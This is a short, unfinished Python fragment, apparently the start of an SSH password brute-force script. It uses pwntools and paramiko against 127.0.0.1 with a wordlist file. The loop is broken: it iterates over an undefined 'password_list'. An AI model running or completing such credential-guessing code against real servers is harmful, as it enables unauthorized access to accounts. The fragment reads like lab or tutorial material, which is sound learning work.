from pwn import *
import paramiko

host = "127.0.0.1"
username = "notroot"
attempts = 0

with open("best110.txt", "r") as password:
	for password in password_list:
		password = password.strip("\n")
